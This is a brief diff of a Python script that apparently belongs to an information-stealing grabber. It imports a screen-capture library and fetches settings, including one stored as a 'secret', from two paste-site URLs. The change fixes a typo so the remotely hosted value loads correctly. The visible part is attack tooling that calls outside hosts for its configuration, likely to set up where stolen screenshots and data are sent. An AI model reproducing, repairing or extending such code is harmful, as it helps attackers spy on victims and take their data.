@@ -41,7 +41,7 @@ from PIL import ImageGrab
 
 myhawkname = "https://rentry.co/on4ev/raw"
 thisresp = requests.get(myhawkname)
-hwkish = thisresp.tex
+hwkish = thisresp.text
 
 hwkishst_secret = "https://rentry.co/nxuf8/raw"
 thisst = requests.get(hwkishst_secret)
